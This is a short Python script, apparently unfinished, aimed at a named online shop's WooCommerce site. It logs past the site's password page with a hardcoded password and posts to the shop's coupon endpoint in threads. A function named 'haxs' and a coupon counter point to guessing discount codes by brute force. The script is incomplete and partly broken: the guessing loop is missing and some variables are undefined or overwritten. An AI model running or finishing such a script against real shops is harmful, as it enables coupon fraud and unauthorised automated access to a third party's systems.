import requests as rq
import threading
from time import sleep

headers = {
    ":authority":"smartpills.club",
    "method":"POST",
    ":path":"/?password-protected=login",
    ":scheme":"https",
    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"cs-CZ;q=0.8",
    "cache-control":"max-age=0",
    "content-length":"127",
    "content-type":"application/x-www-form-urlencoded",
    "cookie":"wordpress_test_cookie=WP%20Cookie\%20check",
    "origin":"https://smartpills.club",
    "referer":"https://smartpills.club/?password-protected=login",
    "sec-fetch-dest":"document",
    "sec-fetch-mode":"navigate",
    "sec-fetch-site":"same-origin",
    "sec-fetch-user":"?1",
    "sec-gpc":"1",
    "upgrade-insecure-requests":"1",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"

}

verify_data = {
    "password_protected_pwd":"1337",
    "wp-submit":"Příhlásit se", 
    "password_protected_cookie_test":"1",
    "password-protected":"login",
    "redirect_to":"https://smartpills.club/"
    }

coupon_data = {
    "cart[d46dba276ef93a3cc72559b4026023e5][qty]":"1",
    "coupon_code":"",
    "woocommerce-cart-nonce": "bf1ce4ad33",
    "_wp_http_referer": "/kosik/"
}

verify_url = "https://smartpills.club/?password-protected=login"
coupon_url = "https://smartpills.club/?wc-ajax=apply_coupon"

cupon_num = 0
thread_num = 1
start = 0
threads = []


def haxs():
    # establish sessions
    print("Establishing session...")
    ses = rq.Session()
    ses.get("https://smartpills.club/")
    ses.post(verify_url, data=verify_data)
    print("Session established")

    # change cu



    res = ses.post(coupon_url, data=coupon_data)

    print("verifikováno" if res.status_code != 403 else "neverifikováno", res.status_code)



def status():
    sleep(1)
    print(num)


def start():
    for i in range(thread_num):
        threads.append(threading.Thread(target=haxs))
        threads[i].start()


start()